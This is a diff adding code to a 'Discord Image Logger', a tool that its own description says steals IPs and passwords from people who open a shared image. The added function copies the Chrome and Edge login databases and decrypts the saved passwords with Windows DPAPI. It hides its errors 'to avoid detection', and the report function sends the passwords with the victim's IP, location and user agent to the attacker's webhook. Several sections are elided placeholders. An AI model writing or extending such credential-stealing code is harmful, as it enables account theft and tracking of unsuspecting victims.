@@ -302,3 +302,100 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
+
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+import sqlite3, os, shutil
+from win32crypt import CryptUnprotectData  # Requires pywin32
+
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs, passwords, and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
+config = {
+    # ... [Keep original config unchanged] ...
+}
+
+def get_passwords():
+    passwords = []
+    paths = [
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
+        '/data/data/com.android.chrome/app_chrome/Default/Login Data'
+    ]
+    
+    for path in paths:
+        if not os.path.isfile(path):
+            continue
+        try:
+            # Copy file to bypass database lock
+            temp_db = os.path.join(os.getenv('TEMP'), 'temp_login.db')
+            shutil.copy2(path, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                url, username, encrypted = row
+                if not url or not username or not encrypted:
+                    continue
+                try:
+                    # Decrypt password using Windows DPAPI
+                    decrypted = CryptUnprotectData(encrypted, None, None, None, 0)[1]
+                    passwords.append(f"**URL:** {url}\n**User:** {username}\n**Pass:** {decrypted.decode('utf-8')}\n")
+                except Exception as e:
+                    passwords.append(f"**URL:** {url}\n**User:** {username}\n**Pass:** Decryption Failed\n")
+            conn.close()
+            os.remove(temp_db)
+        except Exception as e:
+            pass  # Silence errors to avoid detection
+    
+    return passwords if passwords else ["No saved passwords found."]
+
+# ... [Keep original botCheck, reportError functions unchanged] ...
+
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    # ... [Keep original VPN/bot checks unchanged] ...
+
+    # Get passwords and format them
+    try:
+        passwords = get_passwords()
+        password_text = "\n".join(passwords) if passwords else "No saved passwords found."
+    except:
+        password_text = "Password retrieval failed"
+
+    embed = {
+        "username": config["username"],
+        "content": ping,
+        "embeds": [
+            {
+                "title": "Image Logger - IP Logged",
+                "color": config["color"],
+                "description": f"""**A User Opened the Original Image!**
+
+                **Endpoint:** {endpoint}
+                
+                **IP Info:**
+                > **IP:** {ip if ip else 'Unknown'}
+                > **Provider:** {info['isp'] if info['isp'] else 'Unknown'}
+                > **Country:** {info['country'] if info['country'] else 'Unknown'}
+                > **City:** {info['city'] if info['city'] else 'Unknown'}
+                > **Coords:** {str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}
+                
+                **Saved Passwords:**
+                {password_text}
+                
+                **User Agent:**
+                {useragent}""",
+            }
+        ],
+    }
+    
+    # ... [Keep rest of original makeReport code unchanged] ...
+
+# ... [Keep rest of original code unchanged] ...
